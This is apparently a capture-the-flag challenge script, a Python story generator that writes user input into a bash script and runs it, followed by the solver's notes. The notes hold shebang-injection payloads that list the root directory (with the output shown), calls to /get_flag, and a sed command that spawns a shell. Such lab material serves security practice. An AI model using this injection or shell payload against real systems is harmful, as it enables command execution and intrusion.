import time
import os

time.sleep(0.1)

print("Welcome to a story generator.")
print("Answer a few questions to get started.")
print()

name = input("What's your name?\n")
where = input("Where are you from?\n")

def sanitize(s):
  return s.replace("'", '').replace("\n", "")

name = sanitize(name)
where = sanitize(where)

STORY = """

#@NAME's story

NAME='@NAME'
WHERE='@WHERE'

echo "$NAME came from $WHERE. They always liked living there."
echo "They had 3 pets:"

types[0]="dog"
types[1]="cat"
types[2]="fish"

names[0]="Bella"
names[1]="Max"
names[2]="Luna"


for i in 1 2 3
do
  size1=${#types[@]}
  index1=$(($RANDOM % $size1))
  size2=${#names[@]}
  index2=$(($RANDOM % $size2))
  echo "- a ${types[$index1]} named ${names[$index2]}"
done

echo

echo "Well, I'm not a good writer, you can write the rest... Hope this is a good starting point!"
echo "If not, try running the script again."

"""


open("/tmp/script.sh", "w").write(STORY.replace("@NAME", name).replace("@WHERE", where).strip())
os.chmod("/tmp/script.sh", 0o777)

while True:
  s = input("Do you want to hear the personalized, procedurally-generated story?\n")
  if s.lower() != "yes":
    break
  print()
  print()
  os.system("/tmp/script.sh")
  print()
  print()

print("Bye!")

# !/usr/bin/env -vS ls -al / \
"""
total 80
drwxr-xr-x  17 nobody nogroup  4096 Jun 23 17:34 .
drwxr-xr-x  17 nobody nogroup  4096 Jun 23 17:34 ..
lrwxrwxrwx   1 nobody nogroup     7 Jun  5 14:02 bin -> usr/bin
drwxr-xr-x   2 nobody nogroup  4096 Apr 18  2022 boot
drwxr-xr-x   2 nobody nogroup  4096 Jun  5 14:05 dev
drwxr-xr-x  34 nobody nogroup  4096 Jun 23 17:34 etc
-rw-r--r--   1 nobody nogroup    50 Jun  9 01:02 flag
---x--x--x   1 nobody nogroup 16056 Jun  9 01:02 get_flag
drwxr-xr-x   3 nobody nogroup  4096 Jun 23 17:34 home
lrwxrwxrwx   1 nobody nogroup     7 Jun  5 14:02 lib -> usr/lib
lrwxrwxrwx   1 nobody nogroup     9 Jun  5 14:02 lib32 -> usr/lib32
lrwxrwxrwx   1 nobody nogroup     9 Jun  5 14:02 lib64 -> usr/lib64
lrwxrwxrwx   1 nobody nogroup    10 Jun  5 14:02 libx32 -> usr/libx32
drwxr-xr-x   2 nobody nogroup  4096 Jun  5 14:02 media
drwxr-xr-x   2 nobody nogroup  4096 Jun  5 14:02 mnt
drwxr-xr-x   2 nobody nogroup  4096 Jun  5 14:02 opt
dr-xr-xr-x 497 nobody nogroup     0 Jun 25 12:33 proc
drwx------   2 nobody nogroup  4096 Jun  5 14:05 root
drwxr-xr-x   5 nobody nogroup  4096 Jun  5 14:05 run
lrwxrwxrwx   1 nobody nogroup     8 Jun  5 14:02 sbin -> usr/sbin
drwxr-xr-x   2 nobody nogroup  4096 Jun  5 14:02 srv
drwxr-xr-x   2 nobody nogroup  4096 Apr 18  2022 sys
drwxrwxrwt   2 user   user       60 Jun 25 12:34 tmp
drwxr-xr-x  14 nobody nogroup  4096 Jun  5 14:02 usr
drwxr-xr-x  11 nobody nogroup  4096 Jun  5 14:05 var
"""


"""
!/get_flag
Usage: /get_flag Give flag please
"""

"""
!/usr/bin/env -S /get_flag Give \
!/usr/bin/env -S /get_flag Give flag please \
!/usr/bin/env -S xargs -L 3 /get_flag \
!/usr/bin/env -S xargs -p /get_flag Give flag please \
"""

"""
!/usr/bin/env -S sed -n "1e exec sh 1>&0" /etc/hosts \
"""